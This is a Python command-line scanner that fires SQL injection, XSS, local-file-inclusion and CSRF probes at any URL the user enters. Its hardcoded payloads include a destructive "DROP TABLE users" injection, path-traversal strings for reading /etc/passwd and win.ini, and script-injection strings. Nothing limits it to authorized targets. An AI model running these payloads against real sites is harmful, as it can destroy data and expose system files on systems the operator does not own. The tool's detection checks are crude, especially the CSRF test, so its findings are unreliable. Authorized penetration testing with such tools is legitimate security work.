import requests
import sys
import time
from termcolor import colored

# ASCII Art Logo
logo = colored("""
 ███╗   ██╗███████╗████████╗██╗    ██╗██╗███████╗███████╗
 ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██║██╔════╝██╔════╝
 ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║███████╗███████╗
 ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║╚════██║╚════██║
 ██║ ╚████║███████╗   ██║   ╚███╔███╔╝██║███████║███████║
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
--------------------------------------------------------
              ✦ Choose Your Option ✦
--------------------------------------------------------
    [1] SQL Injection Scanner
    [2] XSS Scanner
    [3] LFI Scanner
    [4] CSRF Scanner
--------------------------------------------------------
    Created by CSEB team
--------------------------------------------------------
""", 'yellow')

# Menu Options
def menu():
    print(logo)
    choice = input(colored("  [+] Select an option: ", 'cyan'))
    
    if choice == "1":
        url = input(colored("  [+] Enter target URL (with parameter): ", 'cyan'))
        sql_injection_scan(url)
    elif choice == "2":
        url = input(colored("  [+] Enter target URL: ", 'cyan'))
        xss_scan(url)
    elif choice == "3":
        url = input(colored("  [+] Enter target URL (with file parameter): ", 'cyan'))
        lfi_scan(url)
    elif choice == "4":
        url = input(colored("  [+] Enter target form URL: ", 'cyan'))
        csrf_scan(url)
    else:
        print(colored("\n  [-] Invalid option! Try again.\n", 'red'))
        time.sleep(1)
        menu()

# SQL Injection Scanner
def sql_injection_scan(url):
    payloads = ["'", "' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
    
    print(colored("\n  [*] Testing for SQL Injection...\n", 'green'))
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
            print(colored(f"  [+] SQL Injection Vulnerability Found: {test_url}", 'red'))
            return
    
    print(colored("  [-] No SQL Injection vulnerability found.\n", 'green'))

# XSS Scanner
def xss_scan(url):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

    print(colored("\n  [*] Testing for XSS...\n", 'green'))
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if payload in response.text:
            print(colored(f"  [+] XSS Vulnerability Found: {test_url}", 'red'))
            return
    
    print(colored("  [-] No XSS vulnerability found.\n", 'green'))

# LFI Scanner
def lfi_scan(url):
    payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]

    print(colored("\n  [*] Testing for Local File Inclusion...\n", 'green'))

    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)

        if "root:x:" in response.text or "for 16-bit app support" in response.text:
            print(colored(f"  [+] LFI Vulnerability Found: {test_url}", 'red'))
            return
    
    print(colored("  [-] No LFI vulnerability found.\n", 'green'))

# CSRF Scanner (Basic Test)
def csrf_scan(url):
    print(colored("\n  [*] Checking for CSRF Vulnerability...\n", 'green'))

    response = requests.get(url)
    if "csrf" not in response.text.lower():
        print(colored(f"  [+] CSRF Vulnerability Detected (No CSRF Token Found) at: {url}", 'red'))
    else:
        print(colored("  [-] CSRF Protection Found.\n", 'green'))

# Run the Menu
menu()